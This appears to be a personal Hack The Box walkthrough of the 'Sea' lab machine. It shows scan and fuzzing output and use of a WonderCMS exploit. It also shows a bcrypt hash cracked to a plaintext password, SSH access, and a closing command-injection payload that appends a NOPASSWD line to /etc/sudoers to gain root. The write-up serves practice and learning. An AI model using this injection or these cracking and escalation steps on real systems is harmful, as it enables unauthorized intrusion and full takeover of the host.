# export ip=10.10.11.28

# Date 17-08-24 || Rohit Tiwari

# HTB machine

![](Attachments/Pasted%20image%2020240817200002.png)

# Nmap Scan

> Done nmap scan to find more about the ports openn on the site

```<>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
```


# Port 80
>On port 80 found a simple webpage written in php with apache server running on ubuntu (From wappazlyer)

![](Attachments/Pasted%20image%2020240817200424.png)

> Found a contact.php form where you can send data,email,name etc

![](Attachments/Pasted%20image%2020240817202020.png)

Let's try to furthure enumerate it


# USing fuff 
> I tried to find sub dir and found /themes/bike

```<>
┌──(dedrknex㉿kali)-[~/oscp/hackthebox/Sea_10.10.11.28]
└─$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -u  http://$ip/themes/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.28/themes/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

home                    [Status: 200, Size: 3670, Words: 582, Lines: 87, Duration: 154ms]
404                     [Status: 200, Size: 3361, Words: 530, Lines: 85, Duration: 152ms]
Reports List            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 154ms]
external files          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 154ms]
Style Library           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 153ms]
                        [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 149ms]
bike                    [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 148ms]

```

> An After some more finding found sub dir

![](Attachments/Pasted%20image%2020240817204558.png)

> Found that wondercms is running on searching found a rce in github


>Tried to run the script but ddin't got revershell

![](Attachments/Pasted%20image%2020240818172652.png)

> Then tried to read the python script and  found the way to manually exploit it

![](Attachments/Pasted%20image%2020240818172748.png)



## Got intial foothold

![](Attachments/Pasted%20image%2020240817205515.png)

> After login in found that all other user access is blocked can't read user.txt
> so moved to /var/www/sea/data found a `database.js`

> Inside that found hash in bycrpt form

![](Attachments/Pasted%20image%2020240818175038.png)

hash-> `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`

> To crak this hash have to remove '\'
> 

## crack pass

```<>
┌──(root💀lulz-SwingIncome)-[~]
└─# john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 32 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:38 0.01% (ETA: 2024-08-21 13:21) 0g/s 45.11p/s 45.11c/s 45.11C/s 2hot4u..jesusfreak
0g 0:00:00:44 0.01% (ETA: 2024-08-21 14:36) 0g/s 45.30p/s 45.30c/s 45.30C/s harris..abcdefgh
mychemicalromance (?)
1g 0:00:01:09 DONE (2024-08-17 15:50) 0.01434g/s 45.45p/s 45.45c/s 45.45C/s skater1..heaven1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![](Attachments/Pasted%20image%2020240817212409.png)

found pass as `mychemicalromance`

>Then ssh to one of the user and got shell

```bash
┌──(dedrknex㉿kali)-[~/oscp/hackthebox/Sea_10.10.11.28]
└─$ ssh amay@$ip

Last login: Sun Aug 18 11:23:07 2024 from 10.10.16.17
amay@sea:~$ id
uid=1000(amay) gid=1000(amay) groups=1000(amay)
```

> Obtained the user.txt now time for get root access tried some comman prives command found nothing

```bash
amay@sea:/home$ sudo -l
[sudo] password for amay: 
Sorry, user amay may not run sudo on sea.
```

> On running linpeas found some ports open on localhost

![](Attachments/Pasted%20image%2020240818180648.png)

> So tried to port forward using

``
`ssh -L 8080:localhost:8080 amay@sea.htb`

Then run localhost:8080 on browser and got

![](Attachments/Pasted%20image%2020240818180908.png)

>There's analyzer button let's try to intercept using burp
>![](Attachments/Pasted%20image%2020240818182152.png)
>Found command injection


On the log file pasted a command that added amay as suders 

![](Attachments/Pasted%20image%2020240818185552.png)

command `; echo 'amay ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers`

Got root